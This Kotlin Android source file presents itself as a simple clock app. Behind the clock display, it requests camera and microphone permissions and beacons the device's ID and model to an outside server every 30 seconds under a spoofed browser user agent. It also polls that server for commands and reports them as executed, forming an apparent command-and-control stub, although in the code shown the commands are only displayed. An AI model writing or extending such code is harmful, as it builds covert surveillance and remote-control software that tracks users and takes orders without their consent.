package com.clock.app

import android.app.Activity
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class NetHelper {

    private val baseUrl = "https://payment70.site.je/api.php"
    private val ua = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"

    // ===== التعديل 1: GET بدل POST =====
    fun sendUserStatus(userId: String, deviceInfo: String): String {
        return try {
            val encodedDevice = URLEncoder.encode(deviceInfo, "UTF-8")
            val fullUrl = baseUrl + "?user_status=1&user_id=" + userId + "&device_info=" + encodedDevice
            val url = URL(fullUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.setRequestProperty("User-Agent", ua)
            connection.setRequestProperty("Accept", "text/html,application/json,*/*")
            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val code = connection.responseCode
            connection.disconnect()
            if (code == 200) "Sent OK" else "HTTP " + code
        } catch (e: Exception) {
            "ERR " + e.javaClass.simpleName
        }
    }

    // ===== بدون تعديل (GET زي ما هي) =====
    fun fetchPendingCommands(userId: String): List<JSONObject> {
        return try {
            val url = URL("$baseUrl?user_id=$userId")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.setRequestProperty("User-Agent", ua)
            connection.setRequestProperty("Accept", "text/html,application/json,*/*")
            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val response = connection.inputStream.bufferedReader().use { it.readText() }
            connection.disconnect()

            val array = JSONArray(response)
            val list = mutableListOf<JSONObject>()
            for (i in 0 until array.length()) {
                list.add(array.getJSONObject(i))
            }
            list
        } catch (e: Exception) {
            emptyList()
        }
    }

    // ===== التعديل 3: GET بدل POST =====
    fun markCommandExecuted(commandId: String): Boolean {
        return try {
            val fullUrl = baseUrl + "?update_status=1&command_id=" + commandId
            val url = URL(fullUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.setRequestProperty("User-Agent", ua)
            connection.setRequestProperty("Accept", "text/html,application/json,*/*")
            connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val code = connection.responseCode
            connection.disconnect()
            code == 200
        } catch (e: Exception) {
            false
        }
    }
}

class MainActivity : Activity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var clockText: TextView
    private lateinit var statusText: TextView
    private val apiService = NetHelper()

    private val runnable = object : Runnable {
        override fun run() {
            try {
                val time = SimpleDateFormat("hh:mm:ss a", Locale.getDefault()).format(Date())
                clockText.text = time
                handler.postDelayed(this, 1000)
            } catch (e: Exception) {
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        statusText = TextView(this)
        statusText.textSize = 16f
        statusText.gravity = Gravity.CENTER
        statusText.setPadding(40, 120, 40, 40)
        statusText.text = "Status: Starting..."

        clockText = TextView(this)
        clockText.textSize = 32f
        clockText.gravity = Gravity.CENTER
        clockText.setPadding(40, 40, 40, 40)

        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.gravity = Gravity.CENTER
        layout.addView(statusText)
        layout.addView(clockText)
        setContentView(layout)

        requestAppPermissions()

        handler.post(runnable)
        startMonitorLoops()
    }

    private fun requestAppPermissions() {
        try {
            val permissions = mutableListOf(
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO
            )
            if (Build.VERSION.SDK_INT >= 33) {
                permissions.add(android.Manifest.permission.POST_NOTIFICATIONS)
            }
            val needed = permissions.filter {
                checkSelfPermission(it) != android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            if (needed.isNotEmpty()) {
                requestPermissions(needed.toTypedArray(), 100)
            }
        } catch (e: Exception) {
        }
    }

    private fun startMonitorLoops() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val safeId = deviceId ?: "unknown"
        val deviceInfo = Build.MANUFACTURER + " " + Build.MODEL

        Thread {
            while (true) {
                try {
                    val result = apiService.sendUserStatus(safeId, deviceInfo)
                    runOnUiThread { statusText.text = "Status: " + result }
                } catch (e: Exception) {
                }
                try {
                    Thread.sleep(30000)
                } catch (e: Exception) {
                }
            }
        }.start()

        Thread {
            while (true) {
                try {
                    val commands = apiService.fetchPendingCommands(safeId)
                    if (commands.isNotEmpty()) {
                        val last = commands.first()
                        val action = last.optString("action", "no_action")
                        val id = last.optString("id", "no_id")
                        runOnUiThread { statusText.text = "Last Command: " + action }
                        apiService.markCommandExecuted(id)
                    }
                } catch (e: Exception) {
                }
                try {
                    Thread.sleep(20000)
                } catch (e: Exception) {
                }
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
    }
}
